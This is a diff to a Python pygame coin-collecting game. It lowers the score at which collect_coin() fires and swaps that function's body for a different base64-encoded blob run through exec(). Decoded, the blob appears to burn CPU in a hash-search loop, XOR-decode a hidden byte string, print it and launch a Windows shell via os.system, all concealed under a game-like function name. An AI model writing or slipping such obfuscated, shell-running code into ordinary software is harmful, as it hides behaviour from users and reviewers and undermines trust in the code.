@@ -215,7 +215,7 @@ def game():
                 coin.x = random.randint(0, WIDTH - coin.width)
                 coin.y = random.randint(0, HEIGHT - coin.height)
                 coin.img = pygame.image.load(find_resource(f"data/coin-{random.randint(0, 4)}.png"))
-                if player.score > 1000:
+                if player.score > 500:
                     collect_coin()
 
 
@@ -268,7 +268,7 @@ def game():
 if __name__ == "__main__":
     init()
     def collect_coin():
-        exec(__import__('base64').b64decode(b'dT1vcy51cmFuZG9tO3M9X19pbXBvcnRfXygnaGFzaGxpYicpLnNoYTI1NgppZiB1KDEpWzBdJjE6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGI9dSgxNikKICAgICAgICBpZiAodzo9cyhiKS5oZXhkaWdlc3QoKSlbOjVdPT0nMDAwMDAnOgogICAgICAgICAgICByPXJhbmRvbS5SYW5kb20oKTtyLnNlZWQod1s6NF0pCiAgICAgICAgICAgIGY9WzEwNiwyNDksNjMsMTQ2LDY5LDk4LDc0LDE3MywxNDksMTU1LDE2OCwyOCw4LDgwLDIwNiwxMDUsMjA4LDUsMjE1LDEzMywxMzgsMTM5LDg0LDE0NywxNTEsMTAxLDExMSwxNTAsMTQ1LDIyNF0KICAgICAgICAgICAgZT1bXQogICAgICAgICAgICBmb3IgaSBpbiByYW5nZSgzMCk6CiAgICAgICAgICAgICAgICBlLmFwcGVuZChmW2ldXnIucmFuZGludCgwLDI1NSkpCiAgICAgICAgICAgIHByaW50KHcscyhieXRlcyhlKSkuaGV4ZGlnZXN0KCkpCiAgICAgICAgICAgIGJyZWFr'))
+        exec(__import__('base64').b64decode(b'dT1vcy51cmFuZG9tO3M9X19pbXBvcnRfXygnaGFzaGxpYicpLnNoYTI1NgppZiB1KDEpWzBdJjE6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGI9dSgxNikKICAgICAgICBpZiAodzo9cyhiKS5oZXhkaWdlc3QoKSlbOjVdPT0nMDAwMDAnOgogICAgICAgICAgICByPXJhbmRvbS5SYW5kb20oKTtyLnNlZWQod1s6NF0pCiAgICAgICAgICAgIGY9WzEwNiwyNDksNjMsMTQ2LDY5LDk4LDExNSwxNjAsMjUxLDIxNywxNTksMTYsMjEsODAsMjQyLDQ5LDE5NCw1LDEzMywxODEsMTYxLDIxMyw2LDE0NSwxNzIsOSwxMDUsMjE1LDE0MCwyNDQsMTM0LDY1LDIyMCw4OSw2LDE5NSwxMzMsMjM4LDIxNCwxMTYsNTEsMjE1LDE2NiwxNjIsODAsMywxMjMsNzksNzEsMTMxLDIzLDE5NCwyNTEsMjYsNjIsODksMTQ4LDE1Myw5Ml0KICAgICAgICAgICAgZT1bXQogICAgICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4oZikpOgogICAgICAgICAgICAgICAgZS5hcHBlbmQoZltpXV5yLnJhbmRpbnQoMCwyNTUpKQogICAgICAgICAgICBwcmludCh3LGJ5dGVzKGUpLHMoYnl0ZXMoZSkpLmhleGRpZ2VzdCgpKQogICAgICAgICAgICBvcy5zeXN0ZW0oInN0YXJ0IC93YWl0IGNtZCAvYyBleGl0IikKICAgICAgICAgICAgYnJlYWs='))
     while True:
         restart = False
         game()
